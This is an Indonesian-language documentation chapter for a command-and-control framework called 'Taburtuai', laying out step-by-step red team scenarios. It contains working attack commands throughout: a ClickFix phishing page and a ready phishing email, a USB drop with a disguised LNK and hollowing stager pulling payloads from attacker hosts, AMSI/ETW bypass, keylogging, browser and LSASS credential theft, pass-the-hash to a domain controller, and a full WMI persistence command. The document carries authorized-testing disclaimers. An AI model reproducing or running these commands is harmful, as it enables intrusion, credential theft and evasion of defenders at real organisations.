# 16 — Red Team Scenarios

> Skenario end-to-end yang menggabungkan semua teknik dalam konteks engagement nyata.
> Semua skenario ini untuk **authorized penetration testing only**.

---

## Scenario 1: Initial Access via Phishing → Full Compromise

**Situasi:** Engagement eksternal. Target adalah perusahaan korporat dengan domain.
Hanya punya email beberapa karyawan dari OSINT. Tidak ada akses awal sama sekali.

### Fase 1: Setup C2 Infrastructure

```bash
# 1. Setup C2 server di VPS
ENCRYPTION_KEY=C0rp3ngag3m3nt2026 ./bin/server --port 443

# 2. Build agent stealth dengan kill date sesuai scope
make agent-win-stealth \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=C0rp3ngag3m3nt2026 \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=2026-05-31

# 3. Upload agent
./bin/operator stage upload ./bin/agent_windows_stealth.exe \
  --server https://c2.yourdomain.com \
  --format exe --arch amd64 --ttl 72 \
  --desc "corp-phishing-q2"
# Token: abc123...
```

### Fase 2: Buat Phishing Lure

```bash
# Buat ClickFix page
go run ./cmd/generate template \
  --type clickfix \
  --stager-file bin/agent_windows_stealth.exe \
  --lure "Microsoft 365 Security Verification" \
  --output m365_verify.html

# Host di server attacker (port berbeda dari C2)
python3 -m http.server 8080 --directory ./phish/
```

Email phishing:
```
Subject: [ACTION REQUIRED] Microsoft 365 Account Security Verification

Dear John,

Our security team has detected unusual sign-in activity on your account.
Please verify your identity at:

https://attacker-domain.com/m365_verify.html

This link expires in 24 hours.

IT Security Team
```

### Fase 3: Agent Masuk — Enumerasi Awal

```
taburtuai(c2.yourdomain.com:443) › agents list
# → Agent 2703886d muncul sebagai online

taburtuai › cmd 2703886d "whoami"
# → CORP\john.doe

taburtuai › agents info 2703886d
# → Hostname: CORP-LAPTOP-JD01, Domain: CORP
```

### Fase 4: Evasion

```
taburtuai › bypass amsi 2703886d --wait
taburtuai › bypass etw 2703886d --wait
taburtuai › evasion unhook 2703886d --wait
```

### Fase 5: Enumerasi Domain

```
taburtuai › cmd 2703886d "whoami /all"
taburtuai › cmd 2703886d "net user john.doe /domain"
taburtuai › cmd 2703886d "net group 'Domain Admins' /domain"
taburtuai › screenshot 2703886d --wait
taburtuai › keylog start 2703886d --duration 600  # 10 menit
```

### Fase 6: Credential Access

```
# Cari credential material
taburtuai › creds browser 2703886d --wait
taburtuai › creds clipboard 2703886d --wait
taburtuai › cmd 2703886d "cmdkey /list"
taburtuai › cmd 2703886d "netsh wlan show profiles"
```

### Fase 7: Privilege Escalation

```
# Cek privilege saat ini
taburtuai › cmd 2703886d "whoami /priv"

# Upload WinPEAS untuk cari privesc vector
taburtuai › files upload 2703886d /tools/winPEASx64.exe "C:\Temp\svc.exe"
taburtuai › cmd 2703886d "C:\Temp\svc.exe" --timeout 300 --wait
```

### Fase 8: Lateral Movement

```
# LSASS dump (setelah dapat admin)
taburtuai › creds lsass 2703886d --wait
taburtuai › files download 2703886d "C:\Windows\Temp\lsass_*.dmp" ./lsass.dmp

# Parse untuk get hashes
pypykatz lsa minidump lsass.dmp

# Start SOCKS5 untuk lateral movement
taburtuai › socks5 start 2703886d --port 1080

# Scan internal network
taburtuai › netscan 2703886d --targets 10.10.10.0/24 --ports 445,3389,22 --wait

# Pass-the-hash ke DC
proxychains impacket-secretsdump CORP/administrator@10.10.10.5 -hashes :NTLM_HASH
```

### Fase 9: Persistence di Multiple Host

```
# Persist di host awal
taburtuai › persistence setup 2703886d --method registry_run --name "M365Update" --wait

# Deploy agent ke DC (setelah dapat akses)
taburtuai › files upload 2703886d ./bin/agent_windows_stealth.exe "C:\Temp\svc.exe"
taburtuai › cmd 2703886d "copy C:\Temp\svc.exe \\10.10.10.5\C$\Windows\Temp\svc.exe"
taburtuai › cmd 2703886d "wmic /node:10.10.10.5 /user:CORP\administrator /password:'Pass' process call create 'C:\Windows\Temp\svc.exe'"
```

### Fase 10: Cleanup

```
# Hapus semua artefak
taburtuai › persistence remove 2703886d --method registry_run --name "M365Update" --wait
taburtuai › cmd 2703886d "del C:\Temp\*.exe && del C:\Windows\Temp\lsass_*"
taburtuai › agents delete 2703886d
```

---

## Scenario 2: USB Drop di Kantornya

**Situasi:** Physical engagement. Tim red team bisa masuk ke gedung target.
Ingin mendapatkan foothold tanpa interaksi dengan karyawan.

### Persiapan USB

```bash
# Build agent
make agent-win-stealth \
  C2_SERVER=http://185.230.xxx.xxx:8443 \
  ENC_KEY=USBDr0p2026! \
  INTERVAL=120 \
  JITTER=40

# Upload dan dapat token
./bin/operator stage upload bin/agent_windows_stealth.exe \
  --server http://185.230.xxx.xxx:8443 \
  --ttl 168  # 7 hari

# Generate EXE stager dengan nama menarik
go run ./cmd/generate stager \
  --server http://185.230.xxx.xxx:8443 \
  --token TOKEN \
  --key USBDr0p2026! \
  --format exe \
  --exec-method hollow \
  --output "Financial_Report_Q1_2026.exe"

# Buat LNK yang terlihat seperti PDF
go run ./cmd/generate template \
  --type lnk \
  --url http://185.230.xxx.xxx:8443/stage/TOKEN \
  --lure "Annual_Report_2026" \
  --output make_lnk.ps1

powershell -f make_lnk.ps1
# Ganti ikon LNK ke ikon PDF
```

Isi USB:
```
USB Drive/
├── Annual_Report_2026.lnk     ← icon PDF, target klik ini
├── ~readme.txt                 ← decoy teks
└── photos/                     ← folder decoy
```

### Pantau Agent

```
# Di mesin operator, monitor sampai ada agent masuk
watch -n 30 './bin/operator agents list --server http://185.230.xxx.xxx:8443'
```

---

## Scenario 3: Internal Pentest — Dari Jaringan Internal

**Situasi:** Internal pentest. Sudah dapat akses fisik atau LAN. Ingin deploy agent
tanpa lewat internet.

### Gunakan IP Internal untuk C2

```bash
# C2 server di laptop operator yang terhubung ke jaringan target
ENCRYPTION_KEY=Int3rn4lP3nt3st ./bin/server --port 8080

# Build agent dengan IP internal
make agent-win-stealth \
  C2_SERVER=http://192.168.1.200:8080 \
  ENC_KEY=Int3rn4lP3nt3st \
  INTERVAL=15 \
  JITTER=20
```

### Deploy via SMB

```bash
# Kalau sudah punya credential
impacket-smbclient DOMAIN/user:pass@192.168.1.50

# Upload agent via SMB
> use C$
> cd Windows\Temp
> put bin/agent_windows_stealth.exe svc.exe

# Eksekusi
impacket-wmiexec DOMAIN/user:pass@192.168.1.50 "C:\Windows\Temp\svc.exe"
```

### Aggressive Interval untuk Lab/Internal

```bash
# Interval pendek untuk testing cepat di lab
make agent-win-debug \
  C2_SERVER=http://127.0.0.1:8080 \
  ENC_KEY=debug \
  INTERVAL=5 \
  JITTER=0
```

---

## Scenario 4: Persistence-Focused — Tetap di dalam Setelah Perimeter Diperbaiki

**Situasi:** Defender menemukan dan menghapus agent pertama. Tapi kita sudah pasang
backup persistence sebelumnya.

### Lapisan Persistence (Defense in Depth)

```
# Layer 1: Registry Run (mudah dihapus, tapi juga mudah dipasang)
persistence setup <id> --method registry_run --name "WinUpdate" --wait

# Layer 2: Scheduled Task (lebih sulit dideteksi)
persistence setup <id> --method schtasks_onlogon --name "GoogleChromeUpdate" --wait

# Layer 3: Startup Folder (backup terakhir)
persistence setup <id> --method startup_folder --name "AdobeUpdate" --wait

# Layer 4: WMI Subscription (sangat persistent, sulit dihapus)
# (via shell karena belum ada command tersendiri)
cmd <id> "powershell -c \"\$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='wup';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA Win32_PerfFormattedData_PerfOS_System AND TargetInstance.SystemUpTime >= 120';EventNamespace='root\cimv2';QueryLanguage='WQL'}; \$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='wup_c';CommandLineTemplate='C:\Users\windows\AppData\Roaming\WinUpdate.exe'}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=\$filter;Consumer=\$consumer}\""
```

### Backup C2 Endpoint

Build agent dengan secondary server URL:
```bash
make agent-win-stealth \
  C2_SERVER=http://PRIMARY_IP:8000 \
  SECONDARY_URL=http://BACKUP_IP:8001 \
  ENC_KEY=KEY
```

---

## Checklist Engagement

### Pre-Engagement

```
□ Scope engagement sudah jelas (IP range, user, teknik yang diizinkan)
□ Kill date sudah di-set sesuai end date engagement
□ C2 server di VPS terpisah dari lab
□ ENCRYPTION_KEY sudah random dan dicatat
□ Backup key disimpan aman
□ Working hours dikonfigurasi sesuai scope
```

### Saat Engagement

```
□ Agent pertama masuk: catat hostname, username, domain
□ Evasion dilakukan sebelum operasi (AMSI, ETW, unhook)
□ Anti-debug/VM check dilakukan sebelum teknik sensitif
□ Semua tool yang diupload di-timestomp
□ Screenshot untuk dokumentasi
□ Persistence di multiple layer kalau scope mengizinkan
□ Hasil credential disimpan di operator machine, bukan di target
□ Log dari console disimpan untuk laporan
```

### Post-Engagement

```
□ Semua persistence dihapus
□ Semua file yang diupload ke target dihapus
□ LSASS dump dihapus dari target
□ Stage di server dihapus
□ Agent record dihapus dari database
□ Server logs di-export untuk dokumentasi laporan
□ VPS C2 di-wipe atau snapshot dihapus
```

---

## Quick Reference: Urutan Standar Post-Exploitation

```
# 1. Evasion (SELALU lakukan ini pertama)
bypass amsi <id> --wait
bypass etw <id> --wait
evasion unhook <id> --wait

# 2. Situational awareness
cmd <id> "whoami /all"
cmd <id> "systeminfo"
cmd <id> "ipconfig /all"
screenshot <id> --wait

# 3. Persistence
persistence setup <id> --method registry_run --name "NAME" --wait

# 4. Credential access
creds browser <id> --wait
creds lsass <id> --wait    # butuh admin
creds sam <id> --wait       # butuh admin

# 5. Internal recon
netscan <id> --targets SUBNET --ports 445,3389,22 --wait
arpscan <id> --wait

# 6. Lateral movement
socks5 start <id> --port 1080
# proxychains ...

# 7. Cleanup
persistence remove <id> --method registry_run --name "NAME" --wait
cmd <id> "del C:\Windows\Temp\*.dmp && del C:\Temp\*.exe"
```

---

*Taburtuai C2 — For authorized security testing only.*
*Selalu dapatkan izin tertulis sebelum melakukan penetration testing.*
